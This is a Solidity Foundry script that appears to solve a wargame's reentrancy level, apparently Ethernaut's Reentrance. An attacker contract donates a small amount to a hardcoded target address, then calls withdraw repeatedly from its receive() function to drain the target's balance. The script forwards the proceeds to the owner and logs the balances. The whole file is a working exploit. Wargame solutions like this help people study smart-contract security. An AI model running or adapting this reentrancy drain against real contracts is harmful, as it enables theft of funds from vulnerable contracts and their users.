// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {IReentrance} from "src/10Reentrancy.sol";

contract SusContract {
    IReentrance public reentrance;
    uint256 constant AMOUNT = 1000000000000000;
    address owner;

    constructor(address _reentranceAddress) public {
        reentrance = IReentrance(_reentranceAddress);
        owner = msg.sender;
    }

    function enter() public payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() public {
        reentrance.withdraw(AMOUNT);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(reentrance).balance >= AMOUNT) {
            reentrance.withdraw(AMOUNT);
        }
    }
}

contract ReentranceAttack is Script {
    address constant CHALLENGE = 0x46b1f04B0ccd570B2E64434fc62B5aea8a8331ee;
    uint256 constant AMOUNT = 1000000000000000;

    SusContract public susContract;
    IReentrance public reentrance;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        susContract = new SusContract(CHALLENGE);
        reentrance = IReentrance(CHALLENGE);

        console.log("SusContract deployed at:", address(susContract));
        console.log("1 Reentrance balance:", address(reentrance).balance);
        susContract.enter{value: AMOUNT}();
        susContract.attack();
        console.log("2 Reentrance balance:", address(reentrance).balance);
        console.log("2 SusContract balance:", address(susContract).balance);
        susContract.withdraw();
        console.log("3 SusContract balance:", address(susContract).balance);
        vm.stopBroadcast();
    }
}
